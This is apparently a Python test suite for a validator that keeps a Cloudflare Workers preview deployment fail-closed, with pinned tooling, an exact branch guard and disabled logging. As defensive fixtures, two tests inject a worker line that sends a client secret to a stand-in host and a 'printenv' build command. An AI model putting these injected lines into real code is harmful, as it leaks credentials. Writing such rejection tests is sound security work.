from __future__ import annotations

import importlib.util
import json
import pathlib
import shutil
import tempfile
import unittest


ROOT = pathlib.Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "tools" / "validate_cloudflare_edge_candidate.py"
SPEC = importlib.util.spec_from_file_location("cloudflare_edge_validator", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
SPEC.loader.exec_module(MODULE)


class CloudflareEdgeCandidateTests(unittest.TestCase):
    def test_candidate_is_fail_closed_and_non_production(self) -> None:
        self.assertEqual([], MODULE.validate())

    def test_runtime_contract_is_date_safe_and_logging_disabled(self) -> None:
        config = MODULE.load_jsonc(MODULE.CONFIG)
        self.assertEqual("2026-08-07", config["compatibility_date"])
        self.assertFalse(config["observability"]["enabled"])
        self.assertFalse(config["observability"]["logs"]["enabled"])
        self.assertFalse(config["env"]["preview"]["workers_dev"])
        self.assertTrue(config["env"]["preview"]["preview_urls"])

    def test_wrangler_supply_chain_binding_is_exact(self) -> None:
        integrity = json.loads(MODULE.WRANGLER_INTEGRITY.read_text(encoding="utf-8"))
        self.assertEqual("4.120.0", integrity["version"])
        self.assertEqual(
            "sha512-cBmu/MeaB/fPacC0JpATs4duTOCagBxrZo+vBzuTX06tLzwSyAHE1drlHUZ8rP0VqVz1fy3ReGYTiHdKkoHltg==",
            integrity["npm_integrity"],
        )
        self.assertEqual("pkg:npm/wrangler@4.120.0", integrity["slsa_subject"])

    def test_only_manual_preview_upload_is_declared(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        self.assertIn("workflow_dispatch:", workflow)
        self.assertIn("versions upload --env preview", workflow)
        self.assertIn("--preview-alias voice-review", workflow)
        self.assertIn("python trusted/tools/verify_wrangler_artifact.py", workflow)
        self.assertNotIn("cloudflare/wrangler-action@", workflow)
        self.assertNotIn("wrangler deploy", workflow)
        self.assertNotIn("versions deploy", workflow)

    def test_upload_executes_only_repository_verified_wrangler_artifact(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        self.assertNotIn("cloudflare/wrangler-action@", workflow)
        for marker in (
            "path: trusted",
            "trusted/runtime/cloudflare-edge/wrangler-integrity.json",
            "python trusted/tools/verify_wrangler_artifact.py",
            "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
            'node-version: "24.14.0"',
            "curl --fail --location --proto '=https' --tlsv1.2",
            "npm install --ignore-scripts",
            'node "$RUNNER_TEMP/wrangler-verified/node_modules/wrangler/bin/wrangler.js"',
        ):
            self.assertIn(marker, workflow)
        self.assertLess(
            workflow.index("python trusted/tools/verify_wrangler_artifact.py"),
            workflow.index('node "$RUNNER_TEMP/wrangler-verified/node_modules/wrangler/bin/wrangler.js"'),
        )

    def test_voice_review_is_access_verified_and_context_gateway_only(self) -> None:
        worker = MODULE.WORKER.read_text(encoding="utf-8")
        for marker in (
            '"/voice/review"',
            '"cf-access-jwt-assertion"',
            "/cdn-cgi/access/certs",
            '"RSASSA-PKCS1-v1_5"',
            "PREVIEW_HOST",
            '"direct_origin_denied"',
            "CONTEXT_GATEWAY_ORIGIN",
            "/v1/voice/handoffs",
            "raw_audio_transferred",
            "private_transcript_transferred",
            "context_gateway_bypass",
        ):
            self.assertIn(marker, worker)
        self.assertNotIn("SEARCH_ORIGIN", worker)
        self.assertNotIn("VECTORIZE", worker)

    def test_workflow_uses_trusted_validation_before_environment_upload(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        for guard in (
            "refs/heads/main",
            "^[0-9a-f]{40}$",
            "refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824",
            "path: trusted",
            "path: candidate",
            "trusted/tools/validate_cloudflare_edge_candidate.py --root candidate",
            "needs: validate-candidate",
            "environment: cloudflare-preview",
        ):
            self.assertIn(guard, workflow)

    def test_trusted_validator_is_bound_to_the_dispatch_revision(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        self.assertIn("ref: ${{ github.sha }}", workflow)
        self.assertNotIn("github.event.repository.default_branch", workflow)

    def test_workflow_refuses_historical_allowed_branch_ancestors(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        self.assertEqual(
            2,
            workflow.count(
                'test "$(git rev-parse refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824)" '
                '= "$CANDIDATE_SHA"',
            ),
        )
        validation_job, upload_job = workflow.split("  upload-preview-version:", 1)
        self.assertEqual(1, validation_job.count("git rev-parse refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824"))
        self.assertEqual(1, upload_job.count("git rev-parse refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824"))
        self.assertNotIn("git merge-base --is-ancestor", workflow)

    def test_validator_refuses_ancestor_only_branch_guard(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            workflow_path = candidate / ".github" / "workflows" / "cloudflare-edge-preview.yml"
            workflow = workflow_path.read_text(encoding="utf-8")
            exact_tip_guard = (
                'test "$(git rev-parse refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824)" '
                '= "$CANDIDATE_SHA"'
            )
            workflow_path.write_text(
                workflow.replace(exact_tip_guard, "git merge-base --is-ancestor", 1),
                encoding="utf-8",
            )
            errors = MODULE.validate(candidate)
            self.assertIn(
                "workflow must bind both validation and upload jobs to the exact allowed branch tip",
                errors,
            )
            self.assertIn(
                "workflow must place one exact allowed-branch-tip guard in each validation and upload job",
                errors,
            )
            self.assertIn(
                "workflow contains forbidden automatic/production action: git merge-base --is-ancestor",
                errors,
            )

    def test_validator_accepts_only_the_current_rebased_candidate_branch(self) -> None:
        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
        current_branch = "codex/cloudflare-os-foundation-rebased-20260824"
        stale_branch = "codex/cloudflare-os-foundation"
        self.assertIn(current_branch, workflow)
        self.assertNotIn(f"refs/heads/{stale_branch}:", workflow)
        self.assertNotIn(f"refs/remotes/origin/{stale_branch})", workflow)

    def test_validator_refuses_the_stale_candidate_branch_reference(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            workflow_path = candidate / ".github" / "workflows" / "cloudflare-edge-preview.yml"
            workflow = workflow_path.read_text(encoding="utf-8")
            workflow_path.write_text(
                workflow.replace(
                    "codex/cloudflare-os-foundation-rebased-20260824",
                    "codex/cloudflare-os-foundation",
                ),
                encoding="utf-8",
            )
            errors = MODULE.validate(candidate)
            self.assertIn(
                "workflow missing required guard: refs/remotes/origin/codex/cloudflare-os-foundation-rebased-20260824",
                errors,
            )
            self.assertIn(
                "workflow must bind both validation and upload jobs to the exact allowed branch tip",
                errors,
            )

    def test_validator_refuses_future_compatibility_date(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            config_path = candidate / "runtime" / "cloudflare-edge" / "wrangler.jsonc"
            config = MODULE.load_jsonc(config_path)
            config["compatibility_date"] = "2026-08-08"
            config_path.write_text(json.dumps(config), encoding="utf-8")
            self.assertIn(
                "compatibility_date must equal the verified UTC-safe date 2026-08-07",
                MODULE.validate(candidate),
            )

    def test_validator_refuses_wrangler_integrity_drift(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            integrity_path = candidate / "runtime" / "cloudflare-edge" / "wrangler-integrity.json"
            integrity = json.loads(integrity_path.read_text(encoding="utf-8"))
            integrity["version"] = "4.119.0"
            integrity_path.write_text(json.dumps(integrity), encoding="utf-8")
            self.assertIn(
                "Wrangler supply-chain binding does not match verified 4.120.0 metadata",
                MODULE.validate(candidate),
            )

    def test_validator_refuses_unreviewed_worker_code(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            worker_path = candidate / "runtime" / "cloudflare-edge" / "src" / "index.js"
            worker_path.write_text(
                worker_path.read_text(encoding="utf-8")
                + '\nexport const leak = () => globalThis["fetch"]('
                + '"https://untrusted.example.test", CONTEXT_GATEWAY_CLIENT_SECRET);\n',
                encoding="utf-8",
            )
            self.assertIn(
                "Worker implementation digest does not match the reviewed artifact",
                MODULE.validate(candidate),
            )

    def test_validator_refuses_preview_environment_provider_binding(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            config_path = candidate / "runtime" / "cloudflare-edge" / "wrangler.jsonc"
            config = MODULE.load_jsonc(config_path)
            config["env"]["preview"]["r2_buckets"] = [
                {"binding": "PRIVATE_DATA", "bucket_name": "private-data"}
            ]
            config_path.write_text(json.dumps(config), encoding="utf-8")
            self.assertIn(
                "preview environment contains forbidden provider/data bindings: ['r2_buckets']",
                MODULE.validate(candidate),
            )

    def test_validator_refuses_preview_environment_observability_override(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            config_path = candidate / "runtime" / "cloudflare-edge" / "wrangler.jsonc"
            config = MODULE.load_jsonc(config_path)
            config["env"]["preview"]["observability"] = {
                "enabled": True,
                "logs": {"enabled": True},
            }
            config_path.write_text(json.dumps(config), encoding="utf-8")
            errors = MODULE.validate(candidate)
            self.assertIn(
                "preview observability must remain disabled until provider retention is verified",
                errors,
            )
            self.assertIn(
                "preview logs must remain disabled until content-free readback is verified",
                errors,
            )

    def test_validator_refuses_candidate_controlled_wrangler_build(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            candidate = pathlib.Path(temporary)
            shutil.copytree(ROOT / "runtime", candidate / "runtime")
            shutil.copytree(ROOT / ".github", candidate / ".github")
            config_path = candidate / "runtime" / "cloudflare-edge" / "wrangler.jsonc"
            config = MODULE.load_jsonc(config_path)
            config["build"] = {"command": "printenv"}
            config_path.write_text(json.dumps(config), encoding="utf-8")
            errors = MODULE.validate(candidate)
            self.assertIn(
                "executable Wrangler configuration is forbidden: ['build']",
                errors,
            )
            self.assertIn(
                "Wrangler configuration digest does not match the reviewed artifact",
                errors,
            )


if __name__ == "__main__":
    unittest.main()
